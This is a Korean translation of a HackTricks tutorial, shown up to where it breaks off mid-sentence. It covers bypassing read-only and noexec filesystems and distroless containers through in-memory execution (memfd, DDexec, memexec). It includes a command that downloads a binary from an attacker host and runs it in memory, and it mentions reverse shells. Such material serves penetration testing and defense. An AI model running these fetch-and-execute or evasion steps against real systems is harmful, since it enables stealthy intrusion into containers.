# FS 보호 기능 우회: 읽기 전용 / 실행 불가 / Distroless

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 AWS 해킹을 처음부터 전문가까지 배우세요</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 PDF로 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **해킹 요령을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **저희가 채용 중입니다!** (_유창한 폴란드어 필수_).

{% embed url="https://www.stmcyber.com/careers" %}

## 비디오

다음 비디오에서는 이 페이지에서 언급된 기술에 대해 더 자세히 설명된 내용을 찾을 수 있습니다:

* [**DEF CON 31 - 은밀하고 회피를 위한 Linux 메모리 조작 탐색**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ng 및 메모리 dlopen()을 사용한 은밀한 침입 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## 읽기 전용 / 실행 불가 시나리오

리눅스 머신에서 **읽기 전용 (ro) 파일 시스템 보호**가 특히 컨테이너에서 자주 발견되는 것이 점점 더 일반적해졌습니다. 이는 `securitycontext`에서 **`readOnlyRootFilesystem: true`**를 설정하는 것만으로 ro 파일 시스템을 사용하여 컨테이너를 실행할 수 있기 때문입니다:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

그러나 파일 시스템이 ro로 마운트되어 있더라도 **`/dev/shm`**은 여전히 쓰기 가능하므로 디스크에 아무것도 쓸 수 없는 것은 가짜입니다. 그러나 이 폴더는 **실행 불가 보호**로 마운트되므로 여기에 바이너리를 다운로드하면 **실행할 수 없습니다**.

{% hint style="warning" %}
적색 팀 관점에서는 시스템에 이미 없는 바이너리(백도어 또는 `kubectl`과 같은 열거자)를 **다운로드하고 실행하는 것이 복잡**해집니다.
{% endhint %}

## 가장 쉬운 우회: 스크립트

바이너리를 언급했지만, 인터프리터가 머신 내에 있으면 **쉘 스크립트**(`sh`가 설치되어 있는 경우) 또는 **파이썬 스크립트**(`python`이 설치된 경우)와 같이 **스크립트를 실행**할 수 있습니다.

그러나 이것만으로는 바이너리 백도어 또는 실행해야 할 다른 바이너리 도구를 실행할 수 없을 수도 있습니다.

## 메모리 우회

파일 시스템이 실행을 허용하지 않더라도 바이너리를 실행하려면 **메모리에서 실행**하는 것이 가장 좋습니다. 왜냐하면 **보호 기능이 적용되지 않기 때문**입니다.

### FD + exec 시스템 호출 우회

**Python**, **Perl**, 또는 **Ruby**와 같은 강력한 스크립트 엔진이 머신 내에 있는 경우, 메모리에서 실행할 바이너리를 다운로드하고, 이를 메모리 파일 디스크립터에 저장한 다음(**`create_memfd` 시스템 호출**), **fd를 실행할 파일로 지정**하는 **`exec` 시스템 호출**을 호출할 수 있습니다.

이를 위해 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) 프로젝트를 쉽게 사용할 수 있습니다. 이 프로젝트에 바이너리를 전달하면 **바이너리를 압축하고 b64로 인코딩**하고 **해당 언어로 스크립트를 생성**하여 `create_memfd` 시스템 호출을 통해 만든 **fd**에 **디코딩 및 압축 해제**하는 지침이 포함되어 있습니다. 그리고 **실행**하기 위해 **exec** 시스템 호출을 호출합니다.

{% hint style="warning" %}
PHP 또는 Node와 같은 다른 스크립팅 언어에서는 **스크립트에서 원시 시스템 호출을 호출하는 기본 방법**이 없기 때문에 `create_memfd`를 호출하여 **바이너리를 저장할 메모리 fd**를 만들 수 없으므로 이 방법은 작동하지 않습니다.

또한 `/dev/shm`에 파일이 있는 **일반적인 fd**를 만들어도 **실행할 수 없습니다**. 왜냐하면 **실행 불가 보호**가 적용되기 때문입니다.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)는 **자신의 프로세스 메모리를 수정**하여 **`/proc/self/mem`**을 덮어쓰는 기술로, **프로세스에서 실행되는 어셈블리 코드를 제어**하여 **쉘코드**를 작성하고 프로세스를 **임의의 코드를 실행**하도록 "변이"시킬 수 있습니다.

{% hint style="success" %}
**DDexec / EverythingExec**을 사용하면 **메모리에서 자체 쉘코드** 또는 **임의의 바이너리**를 **로드하고 실행**할 수 있습니다.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
### MemExec

[**Memexec**](https://github.com/arget13/memexec)는 DDexec의 자연스러운 다음 단계입니다. 이것은 **DDexec 셸코드를 데몬화**한 것으로, **다른 이진 파일을 실행하려고 할 때마다 DDexec를 다시 시작할 필요가 없습니다. 대신 DDexec 기술을 통해 memexec 셸코드를 실행하고 이 데몬과 통신하여 새로운 이진 파일을 전달하고 실행할 수 있습니다.**

**memexec를 사용하여 PHP 역쉘에서 이진 파일을 실행하는 예제**는 [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)에서 찾을 수 있습니다.

### Memdlopen

DDexec와 유사한 목적을 가진 [**memdlopen**](https://github.com/arget13/memdlopen) 기술은 **메모리에 이진 파일을 로드하여 나중에 실행하는 더 쉬운 방법**을 제공합니다. 이를 통해 종속성이 있는 이진 파일을 로드할 수도 있습니다.

## Distroless Bypass

### Distroless란

Distroless 컨테이너에는 **특정 응용 프로그램이나 서비스를 실행하는 데 필요한 최소한의 구성 요소만 포함**되어 있습니다. 이는 라이브러리 및 런타임 종속성과 같은 것을 포함하지만 패키지 관리자, 셸 또는 시스템 유틸리티와 같은 큰 구성 요소는 제외됩니다.

Distroless 컨테이너의 목표는 **불필요한 구성 요소를 제거**함으로써 컨테이너의 **공격 표면을 줄이고 악용될 수 있는 취약점의 수를 최소화**하는 것입니다.

### 역쉘

Distroless 컨테이너에서는 보통 `sh`나 `bash`와 같은 것을 찾을 수 없을 수도 있습니다. 또한 `ls`, `whoami`, `id`와 같은 이진 파일도 찾을 수 없습니다. 이는 일반적으로 시스템에서 실행하는 모든 것들입니다.

{% hint style="warning" %}
따라서, 보통 하는 것처럼 **역쉘을 얻거나 시스템을 열거할 수 없을 것**입니다.
{% endhint %}

그러나,
